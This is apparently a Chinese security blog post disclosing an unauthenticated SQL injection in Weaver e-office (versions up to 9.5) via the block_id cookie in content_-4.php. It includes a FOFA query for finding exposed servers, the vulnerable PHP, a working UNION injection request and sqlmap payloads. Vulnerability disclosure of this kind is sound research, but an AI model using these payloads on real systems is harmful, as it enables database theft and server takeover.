---
title: "泛微e-office content_-4.php sql注入漏洞"
source: https://mrxn.net/jswz/eoffice-general-new_mytable-content_list-content-sqli.html
asset_dir: assets/泛微e-office-content_-4.php-sql注入漏洞
---

# 泛微e-office content\_-4.php sql注入漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/3/13 08:23
* 941浏览
* [0评论](#comment)
* 28分钟阅读

深入探索

计算机安全

身份验证

sql


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

[泛微](https://mrxn.net/tag/%E6%B3%9B%E5%BE%AE)E-Office是一款标准化的协同 OA 办公软件，泛微协同办公产品系列成员之一,实行通用化产品设计，充分贴合企业管理需求，本着简洁易用、高效智能的原则，为企业快速打造移动化、无纸化、数字化的办公平台。泛微e-office content\_-4.php 接口处存在[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)漏洞，未经身份验证的恶意攻击者利用 SQL 注入漏洞获取数据库中的信息（例如管理员后台密码、站点用户个人信息）之外，攻击者甚至可以在高权限下向服务器写入命令，进一步获取服务器系统权限。

编程

# 影响版本

e-office <=9.5

# fofa语句

> `app="泛微-EOffice"`

# 漏洞分析

general/new\_mytable/content*list/content*-4.php 业务逻辑如下

深入探索

文件大小转换

网络安全会议

在线安全工具

```
<?php

include_once( "inc/conn.php" );
include_once( "inc/utility_all.php" );
include_once( "inc/function_usergeneral.php" );
include_once( "general/new_mytable/index_function.php" );
includelangpak( "index", $lang );
$nothingdata = $_lang['index_no_data'];
require_once( "inc/function_weather.php" );
require_once( "inc/weather.inc.php" );
$paraarray = getindexpara( $block_id );

...

function getIndexPara( $block_id )
{
    global $connection;
    $query = "\r\n\t\tSELECT * FROM `index_block` WHERE BLOCK_ID={$block_id}\r\n\t\t";
    $rc = exequery( $connection, $query );
    $row = mysql_fetch_array( $rc );
    if ( $row['FONT_STYLE'] == "" )
    {
        $row['FONT_STYLE'] = "black";
    }
    $index_array = array( "block_row" => $row['BLOCK_ROW'], "subject_length" => $row['SUBJECT_LENGTH'], "common_id" => $row['COMMON_ID'], "is_show_date" => $row['IS_SHOW_DATE'], "is_show_creator" => $row['IS_SHOW_CREATOR'], "block_effect" => $row['BLOCK_EFFECT'], "common_str" => $row['COMMON_STR'], "font_style" => $row['FONT_STYLE'], "block_height" => $row['BLOCK_HEIGHT'], "block_layout" => $row['BLOCK_LAYOUT'], "portal_index" => $row['PORTAL_INDEX'] );
    return $index_array;
}
```

深入探索

Web安全课程

企业安全咨询

安全运维咨询

`$block_id` 被直接拼接进SQL语句后执行，无任何过滤校验，造成[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)漏洞。

# 漏洞复现

```
GET /general/new_mytable/content_list/content_-4.php HTTP/1.1
Host: eoffice.mrxn.net:8082
Cookie: block_id=1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x7170706a71,0x4e6b5271596d6c6c4f63796e445741616750714a506d4c464e5075417659424c4c47647a4f48534c,0x7162716a71),NULL,NULL,NULL,NULL,NULL,NULL-- -
```

[![泛微e-office content_-4.php sql注入漏洞](images/img-001-f124725bb1ec.webp)](https://image.mrxn.net/fee351286baf4ccaa63e307064a6ea35.webp)

成功在响应回显测试payload

代码安全审计

<https://mrxn.net/tag/sqlmap> 结果如下

```
sqlmap identified the following injection point(s) with a total of 78 HTTP(s) requests:
---
Parameter: #1* ((custom) POST)
    Type: boolean-based blind
    Title: Boolean-based blind - Parameter replace (original value)
    Payload: block_id=(SELECT (CASE WHEN (9822=9822) THEN 1 ELSE (SELECT 9884 UNION SELECT 3565) END))

    Type: time-based blind
    Title: MySQL < 5.0.12 AND time-based blind (BENCHMARK)
    Payload: block_id=1 AND 1007=BENCHMARK(5000000,MD5(0x5571676b))

    Type: UNION query
    Title: Generic UNION query (NULL) - 18 columns
    Payload: block_id=1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x7170706a71,0x4e6b5271596d6c6c4f63796e445741616750714a506d4c464e5075417659424c4c47647a4f48534c,0x7162716a71),NULL,NULL,NULL,NULL,NULL,NULL-- -
---
```

同目录下其他类似 content\_xxx.php 的基本上都存在同类型问题

漏洞修复方案

[![泛微e-office content_-4.php sql注入漏洞](images/img-002-ce290ad39971.webp)](https://image.mrxn.net/d9ba37c4647d47fb94499b9a92c92785.webp)

[![泛微e-office content_-4.php sql注入漏洞](images/img-003-e50fa10da585.webp)](https://image.mrxn.net/d298ce2688c149168ce44b83556d03af.webp)

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#泛微](https://mrxn.net/tag/%E6%B3%9B%E5%BE%AE)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语句](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [5.漏洞复现](#toc-5-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[泛微e-office content\_-4.php sql注入漏洞](https://mrxn.net/jswz/eoffice-general-new_mytable-content_list-content-sqli.html)  
文章链接：<https://mrxn.net/jswz/eoffice-general-new_mytable-content_list-content-sqli.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

物流软件安全

![](data:image/png;base64,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)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/eoffice-general-new\_mytable-content\_list-content-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

网络安全

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,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